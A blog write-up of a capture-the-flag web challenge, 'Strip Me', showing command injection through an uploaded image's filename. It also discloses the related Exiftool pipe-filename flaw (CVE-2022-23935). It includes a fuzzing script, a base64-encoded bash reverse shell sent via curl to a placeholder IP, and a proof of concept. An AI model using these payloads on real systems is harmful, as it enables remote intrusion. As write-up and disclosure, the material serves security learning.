@@ -1,0 +1,169 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="ie=edge"><meta itemprop=name content="Day 8 - Strip Me"><meta itemprop=description content="Challenge Description Santa wants to make sure he doesn&rsquo;t leak the location of his secret base through image metadata. Therefore, he uses this web service to strip metadata from his photos before publishing them. But he isn&rsquo;t sure whether it&rsquo;s secure. Can you tell him?
+Overview We are given a website that takes an image and returns it striped of it&rsquo;s metadata, but we don&rsquo;t have the site&rsquo;s source code. After a bit of web fuzzing, we find that the filename parameter is vulnerable to command injection, which we can use to get a shell on the machine and grab the flag."><meta itemprop=datePublished content="2022-03-22T12:00:00-06:00"><meta itemprop=dateModified content="2022-03-22T12:00:00-06:00"><meta itemprop=wordCount content="1742"><meta itemprop=keywords content><meta property="og:title" content="Day 8 - Strip Me"><meta property="og:description" content="Challenge Description Santa wants to make sure he doesn&rsquo;t leak the location of his secret base through image metadata. Therefore, he uses this web service to strip metadata from his photos before publishing them. But he isn&rsquo;t sure whether it&rsquo;s secure. Can you tell him?
+Overview We are given a website that takes an image and returns it striped of it&rsquo;s metadata, but we don&rsquo;t have the site&rsquo;s source code. After a bit of web fuzzing, we find that the filename parameter is vulnerable to command injection, which we can use to get a shell on the machine and grab the flag."><meta property="og:type" content="article"><meta property="og:url" content="https://joe.lothan.net/ctfs/2021-advent-otw/08-strip-me/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2022-03-22T12:00:00-06:00"><meta property="article:modified_time" content="2022-03-22T12:00:00-06:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Day 8 - Strip Me"><meta name=twitter:description content="Challenge Description Santa wants to make sure he doesn&rsquo;t leak the location of his secret base through image metadata. Therefore, he uses this web service to strip metadata from his photos before publishing them. But he isn&rsquo;t sure whether it&rsquo;s secure. Can you tell him?
+Overview We are given a website that takes an image and returns it striped of it&rsquo;s metadata, but we don&rsquo;t have the site&rsquo;s source code. After a bit of web fuzzing, we find that the filename parameter is vulnerable to command injection, which we can use to get a shell on the machine and grab the flag."><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color><link rel="shortcut icon" href=/favicon.ico><title>Day 8 - Strip Me</title><link rel=stylesheet href=https://joe.lothan.net/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin=anonymous><link rel=stylesheet href=https://joe.lothan.net/css/custom.css></head><body id=page><header id=site-header class="animated slideInUp"><div class="hdr-wrapper section-inner"><div class=hdr-left><div class=site-branding><a href=https://joe.lothan.net/>Joe Lothan</a></div><nav class="site-nav hide-in-mobile"><a href=https://joe.lothan.net/ctfs/>CTFs</a></nav></div><div class="hdr-right hdr-icons"><span class="hdr-social hide-in-mobile"><a href=https://github.com/ert-plus target=_blank rel="noopener me" title=Github><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://twitter.com/ert_plus target=_blank rel="noopener me" title=Twitter><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a></span><button id=menu-btn class=hdr-btn title=Menu><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></header><div id=mobile-menu class="animated fast"><ul><li><a href=https://joe.lothan.net/ctfs/>CTFs</a></li></ul></div><main class="site-main section-inner thin animated fadeIn faster"><h1>Day 8 - Strip Me</h1><div class=content><h2 id=challenge-description>Challenge Description<a href=#challenge-description class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Santa wants to make sure he doesn&rsquo;t leak the location of his secret base through image metadata. Therefore, he uses this web service to strip metadata from his photos before publishing them. But he isn&rsquo;t sure whether it&rsquo;s secure. Can you tell him?</p><h2 id=overview>Overview<a href=#overview class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>We are given a website that takes an image and returns it striped of it&rsquo;s metadata, but we don&rsquo;t have the site&rsquo;s source code.
+After a bit of web fuzzing, we find that the <code>filename</code> parameter is vulnerable to command injection, which we can use to get a shell on the machine and grab the flag.</p><p>After getting the flag, I poked around the box and realized I didn&rsquo;t do the challenge the intended way. Instead of injecting commands into the challenge&rsquo;s code, I found I was actually injecting commands into <a href=https://exiftool.org>Exiftool</a>, a program commonly used to read, edit, (and in this case) strip images of their metadata.</p><p>If you use Exiftool, you should update it to version 12.38 and above. Details of the vulnerability are <a href=#vulnerability>below</a>.</p><h2 id=writeup>Writeup<a href=#writeup class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>We&rsquo;re given the url <code>http://stripme.advent2021.overthewire.org:1208/</code> which takes you to the following page:</p><p><img src=images/stripme-site.png alt="an image upload form page for the stripme challenge, with a nice polar bear background"></p><p>Initial enumeration didn&rsquo;t reveal much, the site is not much more than a basic image upload form and the backend seemed to be using python.</p><p>Trying a bunch of different files, it looks like we need a valid image, but the filename is very flexible. Uploading an image named, for example, <code>ida.7z</code> works just fine.</p><p>Whipping up a quick and dirty script to fuzz the filename parameter:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>while</span> read c;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>	fn<span style=color:#f92672>=</span>pl.jpg$c
+</span></span><span style=display:flex><span>	cp pl.jpg $fn
+</span></span><span style=display:flex><span>	echo -n <span style=color:#e6db74>&#34;</span>$fn<span style=color:#e6db74> =&gt; &#34;</span>
+</span></span><span style=display:flex><span>	echo <span style=color:#66d9ef>$(</span>curl -v -F <span style=color:#e6db74>&#34;file=@</span>$fn<span style=color:#e6db74>&#34;</span> http://stripme.advent2021.overthewire.org:1208/ 2&gt;&amp;<span style=color:#ae81ff>1</span> 1&gt;/dev/null <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>               | sed -n <span style=color:#e6db74>&#34;s/.*filename=//p&#34;</span><span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>    rm $fn
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span> &lt; special-chars.txt
+</span></span></code></pre></div><p>We get it&rsquo;s output:</p><pre tabindex=0><code>$ ./fuzz.sh
+pl.jpg~ =&gt; pl.jpg~                                           
+pl.jpg! =&gt; pl.jpg!
+pl.jpg@ =&gt; &#34;pl.jpg@&#34;
+pl.jpg# =&gt; pl.jpg#
+pl.jpg$ =&gt; pl.jpg$
+pl.jpg% =&gt; pl.jpg%
+pl.jpg^ =&gt; pl.jpg^
+pl.jpg&amp; =&gt; pl.jpg&amp;
+cp: target &#39;pl.jpg$&#39; is not a directory
+pl.jpg* =&gt; 
+pl.jpg( =&gt; &#34;pl.jpg(&#34;
+pl.jpg) =&gt; &#34;pl.jpg)&#34;
+pl.jpg- =&gt; pl.jpg-
+pl.jpg_ =&gt; pl.jpg_
+pl.jpg+ =&gt; pl.jpg+
+pl.jpg= =&gt; &#34;pl.jpg=&#34;
+pl.jpg{ =&gt; &#34;pl.jpg{&#34;
+pl.jpg} =&gt; &#34;pl.jpg}&#34;
+pl.jpg] =&gt; &#34;pl.jpg]&#34;
+pl.jpg[ =&gt; &#34;pl.jpg[&#34;
+pl.jpg| =&gt; 
+pl.jpg` =&gt; pl.jpg`
+pl.jpg, =&gt; 
+pl.jpg. =&gt; pl.jpg.
+cp: target &#39;pl.jpg$&#39; is not a directory
+pl.jpg? =&gt; 
+pl.jpg; =&gt; pl.jpg
+pl.jpg: =&gt; &#34;pl.jpg:&#34;
+pl.jpg&#39; =&gt; 
+pl.jpg&#34; =&gt; &#34;pl.jpg\&#34;&#34;
+pl.jpg&lt; =&gt; &#34;pl.jpg&lt;&#34;
+pl.jpg&gt; =&gt; &#34;pl.jpg&gt;&#34;
+</code></pre><p>You can see a few errors in the script where bash interpreted <code>*</code> and <code>?</code> as wildcards and tried to use an existing file.</p><p>Also <code>curl</code> has trouble with <code>,</code> and <code>;</code> because it uses those characters to parse its <code>-F</code>orm argument.</p><p>Which leaves us with two interesting results where the webserver doesn&rsquo;t return: <code>pl.jpg'</code> and <code>pl.jpg|</code>.</p><p>The single quote (<code>'</code>) is the classic injection character. Often closing a user-supplied string for a SQL query or OS command, an extra single-quote might be causing this query to error out with mismatched quotes.</p><p>But the pipe character (<code>|</code>) erroring out is also very interesting, particularly when placed at the end of the filename. I first learned in the later <a href=https://overthewire.org/wargames/natas/>Natas</a> levels on OverTheWire, and more recently in the privesc for <a href="https://www.youtube.com/watch?v=4tXFHoeOytE&t=2120">Pikaboo</a> on HackTheBox, that a pipe character at the end of a filename can be used to exploit <a href="https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543">Perl&rsquo;s two argument open</a>.</p><p>In Perl, if you don&rsquo;t specify whether to read &ldquo;&lt;&rdquo; or write &ldquo;>&rdquo; to a file, <code>open</code> will interpert a filename that starts or ends with a pipe as a command to be executed and piped as data. For example:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-perl data-lang=perl><span style=display:flex><span>open(FD, <span style=color:#e6db74>&#39;date |&#39;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span>(<span style=color:#e6db74>&lt;FD&gt;</span>){
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>print</span> $_;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>will not open and print the contents of a file literally named <code>date |</code>, but instead run the command <code>date</code> and read its output as it would a file&rsquo;s contents.</p><p>It would be strange for a Perl vulnerability to be in a challenge written in Python. But searching for &ldquo;strip image metadata command&rdquo; returns many results for Exiftool, a program written in Perl.</p><p>Hmm&mldr; Quite a choice for how to proceed:</p><p><img src=images/choice1.jpg alt="morpheus holding out two pills: the blue one says pl.jpg&amp;rsquo; and the red one says pl.jpg|"></p><blockquote><p>Either you take the quote-pill, the story ends, and you wake up in your bed believing vulns only exist in CTFs. Or you take the pipe-pill, stay in wonderland, and see how deep the call stack goes.</p></blockquote><p>Playing around with the filename ending in a pipe, and I quickly got command injection. The follow command took 5 seconds to return:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl -v -F <span style=color:#e6db74>&#34;file=@test.jpg;filename=sleep 5 |&#34;</span> http://stripme.advent2021.overthewire.org:1208/
+</span></span></code></pre></div><p>Though if you use any <code>/</code> character in your filename, the server errors out with:</p><pre tabindex=0><code>Hacking attempt detected. This incident will be reported!
+</code></pre><p>Using base64 encoding, we can get a bash reverse shell without <code>/</code>s:</p><pre tabindex=0><code>$ echo &#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/my.ip.ad.dr/9001 0&gt;&amp;1&#39;&#34; | base64 
+YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC9teS5pcC5hZC5kci85MDAxIDA+JjEnCg==
+$ curl -v -F &#34;file=@test.jpg;filename=echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC9teS5pcC5hZC5kci85MDAxIDA+JjEnCg== | base64 -d | bash |&#34; http://stripme.advent2021.overthewire.org:1208/
+</code></pre><pre tabindex=0><code>$ nc -lp 9001
+nobody@9d3db3f6a3ad:/opt/strip_me$ id
+id
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+nobody@9d3db3f6a3ad:/opt/strip_me$ ls
+ls
+flag
+server.py
+static
+templates
+uploads
+nobody@9d3db3f6a3ad:/opt/strip_me$ cat flag	
+cat flag 
+AOTW{uPl0aD_y0uR_iMaG3S_t0_tH3_Int3rN3T_f0r_MaX1MuM_pR1VaCy}
+</code></pre><h2 id=exploring-the-challenge>Exploring the challenge<a href=#exploring-the-challenge class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Well that was weird&mldr;</p><p><img src=images/mirror.gif alt="neo touching the liquid glass mirror scene as a gif"></p><blockquote><p>Have you ever found a vuln in a CTF you were so sure was real? What if you were unable to verify that vuln? How would you know the difference between the real vuln and the CTF vuln?</p></blockquote><blockquote><p>This can&rsquo;t be&mldr;</p></blockquote><blockquote><p>Be what? Be a real vuln?</p></blockquote><p>Now that we have a shell on the machine, let&rsquo;s poke around and see how the challenge actually works. Here is the main logic from <a href=files/server.py>server.py</a>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>exif_command <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;exiftool -overwrite_original -all= &#39;</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#39;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app</span><span style=color:#f92672>.</span>route(<span style=color:#e6db74>&#39;/&#39;</span>, methods <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>strip_file</span>():
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        f <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>files[<span style=color:#e6db74>&#39;file&#39;</span>]
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(index,error<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;File missing&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    filename <span style=color:#f92672>=</span> unquote(f<span style=color:#f92672>.</span>filename)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> any(hack_char <span style=color:#f92672>in</span> filename <span style=color:#66d9ef>for</span> hack_char <span style=color:#f92672>in</span> [<span style=color:#e6db74>&#39;/&#39;</span>]):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(index,error<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Hacking attempt detected. This incident will be reported!&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    file_path <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(app<span style=color:#f92672>.</span>config[<span style=color:#e6db74>&#39;UPLOAD_FOLDER&#39;</span>], filename)
+</span></span><span style=display:flex><span>    f<span style=color:#f92672>.</span>save(file_path)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ...</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>        img <span style=color:#f92672>=</span> Image<span style=color:#f92672>.</span>open(file_path)
+</span></span><span style=display:flex><span>        img<span style=color:#f92672>.</span>verify()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(index,error<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;File is not a valid image&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    return_value <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>system(exif_command<span style=color:#f92672>.</span>format(file_path))
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ...</span>
+</span></span></code></pre></div><p>So it seems the intended solution <em>was</em> to use the single-quote to escape out of the <code>exif_command</code> when being passed to <code>os.system</code>! A bit of a challenge blind and with some constraints, but it didn&rsquo;t seem intentional to do command injection into Exiftool itself.</p><p>Let&rsquo;s check the version of Exiftool on the machine.</p><pre tabindex=0><code>nobody@9d3db3f6a3ad:/opt/strip_me$ head -10 /usr/bin/exiftool
+#!/usr/bin/perl -w
+#------------------------------------------------------------------------------
+# File:         exiftool
+#
+# Description:  Read/write meta information
+
+...
+
+my $version = &#39;11.88&#39;;
+</code></pre><p>This was the most recent version in the Ubuntu package manager at the time, though not the most recent version of Exiftool. So after the CTF was over, I downloaded the most recent version and confirmed the vulnerability. Here is a PoC:</p><pre tabindex=0><code>$ ls pwn
+ls: cannot access &#39;pwn&#39;: No such file or directory
+$ ./exiftool &#39;touch pwn |&#39; 
+Error: File not found - touch pwn |
+$ ls pwn
+ls: cannot access &#39;pwn&#39;: No such file or directory
+$ touch &#39;touch pwn |&#39; 
+$ ./exiftool &#39;touch pwn |&#39; 
+ExifTool Version Number         : 12.37
+File Name                       : touch pwn |
+Directory                       : .
+File Size                       : 0 bytes
+File Modification Date/Time     : 2021:12:19 14:28:45-06:00
+File Access Date/Time           : 2021:12:19 14:28:45-06:00
+File Inode Change Date/Time     : 2021:12:19 14:28:45-06:00
+File Permissions                : prw-------
+Error                           : File is empty
+$ ls pwn 
+pwn
+</code></pre><p>The one major requirement I found was that the file needed to exist on the machine for the vulnerability to be triggered, or else Exiftool would error out with <code>File not found</code>. The &ldquo;Strip Me&rdquo; challenge copied the file to disk with the same filename before running Exiftool, satisfying this requirement.</p><p><img src=images/listen-here-jack.jpg alt="still from the matrix where morpheus explains to neo what the matrix is"></p><blockquote><p>This is the world that you know, the world that exists at ctftime.org</p></blockquote><blockquote><p>It exists now as part of a neural interactive simulation that we call &ldquo;computer gaming&rdquo;</p></blockquote><blockquote><p>You&rsquo;ve been living in a dream world - <em>this</em> is the world as it exists today</p></blockquote><blockquote><p>Welcome to the Desert of the Real-Life vulnerabilities</p></blockquote><p>I emailed Phil Harvey, the creator of Exiftool, with the above information and a fix was released with <a href=https://github.com/exiftool/exiftool/commit/74dbab1d2766d6422bb05b033ac6634bf8d1f582>version 12.38</a> within 24 hours.</p><p>I was told by some online hacker friends to request a CVE. It was assigned <a href="https://www.cve.org/CVERecord?id=CVE-2022-23935">CVE-2022-23935</a> and <a href=https://nvd.nist.gov/vuln/detail/CVE-2022-23935>NIST</a> gave it a CVSS of 9.8.</p><p>Finally here is a more formal write-up with a peak at Exiftool&rsquo;s code:</p><h2 id=vulnerability>Vulnerability<a href=#vulnerability class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><h3 id=overview-1>Overview<a href=#overview-1 class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p>Exiftool versions &lt; 12.38 are vulnerable to Command Injection through a crafted filename. If the filename passed to exiftool ends with a pipe character <code>|</code> and exists on the filesystem, then the file will be treated as a pipe and executed as an OS command.</p><h3 id=description>Description<a href=#description class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><p><a href=https://exiftool.org>Exiftool</a> is a &ldquo;a platform-independent Perl library plus a command-line application for reading, writing and editing meta information in a wide variety of files.&rdquo; One of its features is being able to read metadata of compressed images. The code for this is <code>GetImageInfo</code> in <code>exiftool</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Perl data-lang=Perl><span style=display:flex><span><span style=color:#66d9ef>sub</span> <span style=color:#a6e22e>GetImageInfo</span>($$)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span><span style=color:#75715e># ...</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($doUnzip) {
+</span></span><span style=display:flex><span>        <span style=color:#75715e># pipe through gzip or bzip2 if necessary</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($file <span style=color:#f92672>=~</span><span style=color:#e6db74> /\.(gz|bz2)$/i</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>my</span> $type <span style=color:#f92672>=</span> lc $1;
+</span></span><span style=display:flex><span><span style=color:#75715e># ...</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> ($type <span style=color:#f92672>eq</span> <span style=color:#e6db74>&#39;gz&#39;</span>) {
+</span></span><span style=display:flex><span>                $pipe <span style=color:#f92672>=</span> <span style=color:#e6db74>qq{gzip -dc &#34;$file&#34; |}</span>;
+</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>                $pipe <span style=color:#f92672>=</span> <span style=color:#e6db74>qq{bzip2 -dc &#34;$file&#34; |}</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p><code>$pipe</code> is eventually passed to <code>Open</code> in <code>lib/Image/ExifTool.pm</code>, which sets the file mode to read only (<code>&lt;</code>), unless the last character is <code>|</code>. When the mode is not set and the last character is a <code>|</code>, <a href="https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543">Perl&rsquo;s two argument open</a> will execute the command and &ldquo;open&rdquo; the command&rsquo;s output for reading, in this case to allow the gzip or bzip2 wrapper.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Perl data-lang=Perl><span style=display:flex><span><span style=color:#66d9ef>sub</span> <span style=color:#a6e22e>Open</span>($*$;$)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>my</span> ($self, $fh, $file, $mode) <span style=color:#f92672>=</span> @_;
+</span></span><span style=display:flex><span>    $file <span style=color:#f92672>=~</span> <span style=color:#e6db74>s/^([\s&amp;])/.\/$1/</span>; <span style=color:#75715e># protect leading whitespace or ampersand</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># default to read mode (&#39;&lt;&#39;) unless input is a pipe</span>
+</span></span><span style=display:flex><span>    $mode <span style=color:#f92672>=</span> ($file <span style=color:#f92672>=~</span><span style=color:#e6db74> /\|$/</span> ? <span style=color:#e6db74>&#39;&#39;</span> : <span style=color:#e6db74>&#39;&lt;&#39;</span>) <span style=color:#66d9ef>unless</span> $mode;
+</span></span><span style=display:flex><span><span style=color:#75715e># ...</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> open $fh, <span style=color:#e6db74>&#34;$mode$file&#34;</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Unfortunately there is no check that the pipe to open comes from a trusted command like <code>gzip -dc "$file" |</code> in <code>GetImageInfo</code>. An attacker can pass a filename that ends with a pipe (<code>|</code>) to exiftool and if it exists on the filesystem, execute it as an operating system command.</p><h3 id=proof-of-concept>Proof of Concept<a href=#proof-of-concept class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h3><pre tabindex=0><code>$ ls pwn
+ls: cannot access &#39;pwn&#39;: No such file or directory
+$ touch &#39;touch pwn |&#39;
+$ ./exiftool &#39;touch pwn |&#39;
+ExifTool Version Number         : 12.37
+File Name                       : touch pwn |
+Directory                       : .
+File Size                       : 0 bytes
+File Modification Date/Time     : 2022:01:18 18:40:18-06:00
+File Access Date/Time           : 2022:01:18 18:40:18-06:00
+File Inode Change Date/Time     : 2022:01:18 18:40:18-06:00
+File Permissions                : prw-------
+Error                           : File is empty
+$ ls pwn
+pwn
+</code></pre><h2 id=final-thoughts>Final Thoughts<a href=#final-thoughts class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h2><p>Just wanted to say thanks to:</p><p>Phil Harvey for building and maintaining Exiftool and issuing a very quick fix</p><p><a href=https://twitter.com/semchapeu>Semchapeu</a> for the great challenge</p><p>b0bb, Steven, and the great community at <a href=overthewire.org>overthewire.org</a></p></div></main><footer id=site-footer class="section-inner thin animated fadeIn faster"><p>&copy; 2022 <a href=https://joe.lothan.net/>Joe Lothan</a></p><p>Made with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> &#183; Theme <a href=https://github.com/Track3/hermit target=_blank rel=noopener>Hermit</a> &#183; <a href=https://joe.lothan.net/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></p></footer><script src=https://joe.lothan.net/js/bundle.min.8256b8724b9578bbdf6d6f04c894255bc760e78e8a2d60ec0a91ea993acd3b77.js integrity="sha256-gla4ckuVeLvfbW8EyJQlW8dg546KLWDsCpHqmTrNO3c=" crossorigin=anonymous></script></body></html>
